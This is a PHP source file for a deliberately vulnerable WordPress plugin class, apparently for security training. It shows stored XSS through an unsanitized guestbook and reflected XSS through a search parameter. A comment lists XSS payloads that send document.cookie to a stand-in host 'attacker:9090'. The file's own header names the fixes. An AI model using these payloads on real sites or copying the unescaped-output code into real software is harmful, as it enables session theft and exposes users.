<?php
/**
 * XSS (Cross-Site Scripting) Demo
 *
 * VULNERABILITY: Unescaped user output (Stored + Reflected XSS)
 * FIX: Use esc_html(), esc_attr(), wp_kses(), CSP headers
 */

class Vuln_XSS_Demo {

    public function __construct() {
        // Stored XSS - Guestbook submission
        add_action( 'wp_ajax_vuln_guestbook_submit', [ $this, 'vulnerable_guestbook_submit' ] );
        add_action( 'wp_ajax_nopriv_vuln_guestbook_submit', [ $this, 'vulnerable_guestbook_submit' ] );

        // Reflected XSS - Search page
        add_action( 'template_redirect', [ $this, 'vulnerable_search_page' ] );

        // Guestbook display shortcode
        add_shortcode( 'vuln_guestbook', [ $this, 'render_guestbook_shortcode' ] );
    }

    /**
     * VULNERABLE: Stored XSS via guestbook
     *
     * Attack: Submit name or message containing:
     *   <script>fetch('http://attacker:9090/steal?c='+document.cookie)</script>
     *   <img src=x onerror="fetch('http://attacker:9090/steal?c='+document.cookie)">
     *   <svg onload="alert('XSS')">
     */
    public function vulnerable_guestbook_submit() {
        global $wpdb;
        $table = $wpdb->prefix . 'vuln_guestbook';

        // VULNERABILITY: No sanitization of input before storing
        $name    = isset( $_POST['name'] ) ? $_POST['name'] : '';
        $message = isset( $_POST['message'] ) ? $_POST['message'] : '';

        $wpdb->insert( $table, [
            'name'    => $name,     // Stored unsanitized
            'message' => $message,  // Stored unsanitized
        ] );

        // Redirect back
        wp_redirect( admin_url( 'admin.php?page=vuln-demo&guestbook=success' ) );
        exit;
    }

    /**
     * VULNERABLE: Reflected XSS via search parameter
     *
     * Attack: Visit /?vuln_search_page=1&q=<script>alert('XSS')</script>
     */
    public function vulnerable_search_page() {
        if ( ! isset( $_GET['vuln_search_page'] ) ) {
            return;
        }

        $query = isset( $_GET['q'] ) ? $_GET['q'] : '';

        // VULNERABILITY: Reflecting user input without escaping
        echo '<!DOCTYPE html><html><head><title>Search Results</title></head><body>';
        echo '<h1>Search Results</h1>';
        echo '<p>You searched for: ' . $query . '</p>';  // REFLECTED XSS
        echo '<form method="get">';
        echo '<input type="hidden" name="vuln_search_page" value="1">';
        echo '<input type="text" name="q" value="' . $query . '" size="50">';  // REFLECTED XSS in attribute
        echo '<button type="submit">Search</button>';
        echo '</form>';
        echo '<p><small>This page is intentionally vulnerable to Reflected XSS</small></p>';
        echo '</body></html>';
        exit;
    }

    /**
     * Shortcode to display guestbook on frontend
     * [vuln_guestbook]
     */
    public function render_guestbook_shortcode() {
        global $wpdb;
        $table = $wpdb->prefix . 'vuln_guestbook';

        $entries = $wpdb->get_results( "SELECT * FROM $table ORDER BY created_at DESC LIMIT 20" );

        ob_start();
        echo '<div class="vuln-guestbook">';
        echo '<h3>Guestbook</h3>';

        echo '<form method="post" action="' . admin_url( 'admin-ajax.php' ) . '">';
        echo '<input type="hidden" name="action" value="vuln_guestbook_submit">';
        echo '<p><input type="text" name="name" placeholder="Your Name" required></p>';
        echo '<p><textarea name="message" placeholder="Your Message" required></textarea></p>';
        echo '<p><button type="submit">Sign Guestbook</button></p>';
        echo '</form>';

        if ( $entries ) {
            foreach ( $entries as $entry ) {
                echo '<div class="guestbook-entry" style="border:1px solid #ccc;padding:10px;margin:5px 0;">';
                // VULNERABILITY: No escaping on output
                echo '<strong>' . $entry->name . '</strong>';
                echo '<p>' . $entry->message . '</p>';
                echo '<small>' . $entry->created_at . '</small>';
                echo '</div>';
            }
        }

        echo '</div>';
        return ob_get_clean();
    }
}
